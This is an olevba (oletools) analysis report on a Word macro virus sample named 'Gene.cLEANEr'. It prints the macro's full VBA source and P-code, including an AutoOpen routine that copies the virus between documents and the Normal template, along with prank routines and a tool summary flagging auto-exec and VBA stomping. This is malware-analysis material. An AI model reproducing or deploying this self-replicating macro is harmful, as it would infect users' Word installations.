olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Poc.b
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Poc.b - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO cLEANEr.bas 
in file: Virus.MSWord.Poc.b - OLE stream: 'Macros/VBA/cLEANEr'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'Gene.cLEANEr virus authored by GeneCode


Sub AutoOpen()
Application.EnableCancelKey = True
Options.VirusProtection = True
Set V1Stealth = CommandBars("Tools")
Set V2Stealth = V1Stealth.Controls(12)
V2Stealth.Enabled = True

If UCase(ThisDocument.Name) = "NORMAL.DOT" Then
  For i = 1 To ActiveDocument.VBProject.VBComponents.Count
        If ActiveDocument.VBProject.VBComponents(i).Name = "cLEANEr" Then GoTo EndCleaner
  Next i
    VSource = NormalTemplate.FullName
    VTarget = ActiveDocument.FullName
Else
  For i = 1 To NormalTemplate.VBProject.VBComponents.Count
        If NormalTemplate.VBProject.VBComponents(i).Name = "cLEANEr" Then GoTo EndCleaner
  Next i
    VSource = ActiveDocument.FullName
    VTarget = NormalTemplate.FullName
End If
Application.OrganizerCopy VSource, VTarget, "cLEANEr", wdOrganizerObjectProjectItems
EndCleaner:
End Sub

Sub Save()
Set myDocument = ActiveDocument
With myDocument.Shapes.AddShape(msoSmileyFace, 90, 90, 90, 50).Fill
    .ForeColor.RGB = RGB(128, 0, 0)
    .BackColor.RGB = RGB(170, 0, 170)
    .TwoColorGradient msoGradientHorizontal, 1
End With
End Sub

Sub AutoClose()
Dim Count As Integer
    For Count = 1 To 10
        Beep
        Beep
    Next
MsgBox "cLEANEr Says All Work And No Play Makes You A LAMER!"
End Sub


-------------------------------------------------------------------------------
VBA MACRO NewMacros 
in file: Virus.MSWord.Poc.b - OLE stream: 'NewMacros'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Poc.b
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 965 bytes
' Macros/VBA/cLEANEr - 3586 bytes
' Line #0:
' 	QuoteRem 0x0000 0x0027 "Gene.cLEANEr virus authored by GeneCode"
' Line #1:
' Line #2:
' Line #3:
' 	FuncDefn (Sub AutoOpen())
' Line #4:
' 	LitVarSpecial (True)
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #5:
' 	LitVarSpecial (True)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #6:
' 	SetStmt 
' 	LitStr 0x0005 "Tools"
' 	ArgsLd CommandBars 0x0001 
' 	Set V1Stealth 
' Line #7:
' 	SetStmt 
' 	LitDI2 0x000C 
' 	Ld V1Stealth 
' 	ArgsMemLd Controls 0x0001 
' 	Set V2Stealth 
' Line #8:
' 	LitVarSpecial (True)
' 	Ld V2Stealth 
' 	MemSt Enabled 
' Line #9:
' Line #10:
' 	Ld ThisDocument 
' 	MemLd New 
' 	ArgsLd UCase 0x0001 
' 	LitStr 0x000A "NORMAL.DOT"
' 	Eq 
' 	IfBlock 
' Line #11:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	For 
' Line #12:
' 	Ld i 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	LitStr 0x0007 "cLEANEr"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo EndCleaner 
' 	EndIf 
' Line #13:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #14:
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	St VSource 
' Line #15:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	St VTarget 
' Line #16:
' 	ElseBlock 
' Line #17:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	For 
' Line #18:
' 	Ld i 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	LitStr 0x0007 "cLEANEr"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo EndCleaner 
' 	EndIf 
' Line #19:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #20:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	St VSource 
' Line #21:
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	St VTarget 
' Line #22:
' 	EndIfBlock 
' Line #23:
' 	Ld VSource 
' 	Ld VTarget 
' 	LitStr 0x0007 "cLEANEr"
' 	Ld wdOrganizerObjectProjectItems 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #24:
' 	Label EndCleaner 
' Line #25:
' 	EndSub 
' Line #26:
' Line #27:
' 	FuncDefn (Sub Save())
' Line #28:
' 	SetStmt 
' 	Ld ActiveDocument 
' 	Set myDocument 
' Line #29:
' 	StartWithExpr 
' 	Ld msoSmileyFace 
' 	LitDI2 0x005A 
' 	LitDI2 0x005A 
' 	LitDI2 0x005A 
' 	LitDI2 0x0032 
' 	Ld myDocument 
' 	MemLd Shapes 
' 	ArgsMemLd AddShape 0x0005 
' 	MemLd Fill 
' 	With 
' Line #30:
' 	LitDI2 0x0080 
' 	LitDI2 0x0000 
' 	LitDI2 0x0000 
' 	ArgsLd RSet 0x0003 
' 	MemLdWith ForeColor 
' 	MemSt RSet 
' Line #31:
' 	LitDI2 0x00AA 
' 	LitDI2 0x0000 
' 	LitDI2 0x00AA 
' 	ArgsLd RSet 0x0003 
' 	MemLdWith BackColor 
' 	MemSt RSet 
' Line #32:
' 	Ld msoGradientHorizontal 
' 	LitDI2 0x0001 
' 	ArgsMemCallWith TwoColorGradient 0x0002 
' Line #33:
' 	EndWith 
' Line #34:
' 	EndSub 
' Line #35:
' Line #36:
' 	FuncDefn (Sub AutoClose())
' Line #37:
' 	Dim 
' 	VarDefn Count (As Integer)
' Line #38:
' 	StartForVariable 
' 	Ld Count 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x000A 
' 	For 
' Line #39:
' 	ArgsCall Beep 0x0000 
' Line #40:
' 	ArgsCall Beep 0x0000 
' Line #41:
' 	StartForVariable 
' 	Next 
' Line #42:
' 	LitStr 0x0034 "cLEANEr Says All Work And No Play Makes You A LAMER!"
' 	ArgsCall MsgBox 0x0001 
' Line #43:
' 	EndSub 
' Line #44:
' Line #45:
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

